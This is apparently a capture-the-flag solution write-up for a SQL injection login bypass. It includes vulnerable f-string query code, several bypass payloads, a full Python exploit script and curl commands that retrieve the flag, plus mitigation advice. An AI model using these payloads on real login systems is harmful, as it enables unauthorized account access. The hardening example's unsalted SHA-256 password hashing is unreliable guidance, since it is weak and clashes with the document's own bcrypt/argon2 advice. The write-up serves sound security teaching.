# Challenge 21: SQLiLogin — Solution

## Vulnerability Type
**SQL Injection (Classic Login Bypass)**

## Description
The login form constructs SQL queries using Python f-strings, directly interpolating user-controlled input without sanitization. An attacker can inject SQL metacharacters to alter the query logic, bypassing authentication and logging in as any user — including the admin who holds the flag.

## Vulnerable Code

```python
# app.py — login route
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
conn.execute(query)
user = c.fetchone()
```

When `username = admin'--` the query becomes:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- everything after -- is a comment, password check is skipped
```

## Exploitation Steps

### Method 1 — Comment-out the password check

**Username field:**
```
admin'--
```
**Password field:** anything (e.g. `x`)

The full SQL becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='x'
```
→ Returns admin row, login succeeds.

### Method 2 — OR-based bypass (works for any row)

**Username field:**
```
' OR '1'='1
```
**Password field:**
```
' OR '1'='1
```

The full SQL becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```
→ First row returned is admin (id=1). Role = admin → flag is shown.

### Method 3 — Target admin explicitly

**Username field:**
```
' OR username='admin'--
```
**Password field:** anything

## Complete Exploit Script

```python
import requests

TARGET = "http://<host>:5000"

s = requests.Session()

# Method 1: comment-out password check
r = s.post(f"{TARGET}/login", data={
    "username": "admin'--",
    "password": "x"
})

# Follow redirect to /dashboard
r = s.get(f"{TARGET}/dashboard")

if "FCTF{" in r.text:
    import re
    flag = re.search(r"FCTF\{[^}]+\}", r.text).group()
    print(f"[+] Flag: {flag}")
else:
    print("[-] Failed — check credentials")
    print(r.text[:500])
```

### Manual with curl

```bash
# Login
curl -c cookies.txt -X POST http://<host>:5000/login \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x" \
  -L

# Get flag
curl -b cookies.txt http://<host>:5000/dashboard
```

## Mitigation

### Fix: Use Parameterized Queries

```python
# BEFORE (vulnerable)
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
c.execute(query)

# AFTER (safe)
c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

### Additional Hardening

```python
# Hash passwords (never store plaintext)
import hashlib
def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

# Use an ORM like SQLAlchemy (auto-parameterized)
user = User.query.filter_by(username=username, password=hash_pw(password)).first()
```

## How the Attack Works

```
Normal query:
  WHERE username='alice' AND password='alice1234'
  → match found  ✓

Injected query (admin'--):
  WHERE username='admin'--' AND password='x'
                          ↑
                     comment starts here
                     rest of query ignored
  → match admin  ✓  (no password needed)
```

## Learning Points
- **Never** interpolate user input into SQL strings
- Always use parameterized queries / prepared statements
- Store passwords as salted hashes (bcrypt, argon2)
- Log and rate-limit failed login attempts
- Apply least-privilege DB permissions (SELECT only, no DROP/ALTER)

## References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
